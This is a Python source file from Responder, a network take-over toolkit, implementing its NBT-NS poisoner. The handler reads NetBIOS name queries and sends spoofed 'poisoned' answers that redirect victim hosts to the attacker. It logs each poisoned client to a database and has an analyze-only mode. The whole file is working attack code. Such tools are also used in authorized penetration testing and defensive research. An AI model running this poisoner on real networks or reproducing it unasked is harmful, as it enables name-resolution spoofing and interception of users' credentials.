#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import sys
from socketserver import BaseRequestHandler

from packets import NBT_Ans
from utils import *

REQUESTS = set()

# NBT_NS Server class.
class NBTNS(BaseRequestHandler):

    def handle(self):

        data, socket = self.request
        Name = Decode_Name(NetworkRecvBufferPython2or3(data[13:45]))
        # Break out if we don't want to respond to this host
        if RespondToThisHost(self.client_address[0].replace("::ffff:",""), Name) is not True:
            return None

        if data[2:4] == b'\x01\x10':  # Analyze Mode
            if settings.Config.AnalyzeMode:
                request_ident = f"{self.client_address[0]}{Name}"
                if settings.Config.unique_dedup and request_ident in REQUESTS:
                    return
                else:
                    REQUESTS.add(request_ident)
                    print(text('[Analyze mode: NBT-NS] Request by %-15s for %s, ignoring' % (color(self.client_address[0].replace("::ffff:",""), 3), color(Name, 3))))
                    SavePoisonersToDb({
                                'Poisoner': 'NBT-NS', 
                                'SentToIp': self.client_address[0], 
                                'ForName': Name,
                                'AnalyzeMode': '1',
                            })
            else:
                Buffer1 = NBT_Ans()
                Buffer1.calculate(data)
                socket.sendto(NetworkSendBufferPython2or3(Buffer1), self.client_address)
                if not settings.Config.Quiet_Mode:
                    LineHeader = "[*] [NBT-NS]"
                    print(
                        color(
                            f'{LineHeader} Poisoned answer sent to {self.client_address[0].replace("::ffff:", "")} for name {Name} (service: {NBT_NS_Role(NetworkRecvBufferPython2or3(data[43:46]))})',
                            2,
                            1,
                        )
                    )
                SavePoisonersToDb({
                            'Poisoner': 'NBT-NS', 
                            'SentToIp': self.client_address[0], 
                            'ForName': Name,
                            'AnalyzeMode': '0',
                        })

